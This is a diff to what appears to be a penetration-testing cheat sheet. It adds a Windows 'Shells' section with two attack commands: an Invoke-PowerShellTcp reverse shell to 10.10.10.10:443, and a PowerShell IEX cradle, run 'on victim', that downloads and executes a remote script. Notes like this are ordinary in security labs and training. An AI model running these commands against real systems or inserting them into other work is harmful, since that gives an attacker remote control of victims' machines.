@@ -54,6 +54,20 @@ getcap -r / 2>/dev/null
 ------------------------------------------------------------------------------------------------------
 # Windows Section
 
+# Shells
+
+With Invoke-PowerShellTcp. Add the following to the bottom.
+
+```powershell
+Invoke-PowerShellTcp -Reverse 10.10.10.10 -Port 443
+```
+
+Run on victim
+
+```powershell
+powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.10.10/Invoke-PowerShellTcp.ps1\")
+```
+
 ## MSSQL Server
 
 Connecting with [impackets-msqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
